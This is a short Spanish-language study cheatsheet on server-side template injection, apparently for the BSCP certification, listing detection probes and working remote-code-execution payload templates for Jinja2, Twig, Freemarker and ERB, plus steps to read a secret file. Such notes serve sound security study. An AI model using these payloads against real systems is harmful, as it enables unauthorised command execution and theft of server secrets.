---
tipo: cheatsheet
vuln: ssti
tags: [bscp, tipo/cheatsheet, vuln/ssti]
relacionada: "[[SSTI]]"
---

# CS · SSTI

## Flujo repetible
1. Inyecta expresiones matemáticas para detectar evaluación.
2. Identifica el motor por la sintaxis que evalúe.
3. Escala de expresión → lectura de fichero → RCE.

## Detección
```
{{7*7}}   ${7*7}   ${{7*7}}   #{7*7}   <%= 7*7 %>     -- detección
```

## Plantillas de payload
```
{{cycler.__init__.__globals__.os.popen('{{CMD}}').read()}}          -- Jinja2/Python
{{['{{CMD}}']|filter('system')}}                                     -- Twig/PHP
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("{{CMD}}")}  -- Freemarker/Java
<%= system('{{CMD}}') %>                                             -- ERB/Ruby
```

## Escalada al objetivo
Identifica motor → RCE → leer {{SECRET_PATH}}.

## Checklist
- [ ] Confirmé evaluación con 7*7
- [ ] Identifiqué el motor
- [ ] Ejecuté {{CMD}} / leí fichero

## Referencias
- https://portswigger.net/web-security/server-side-template-injection
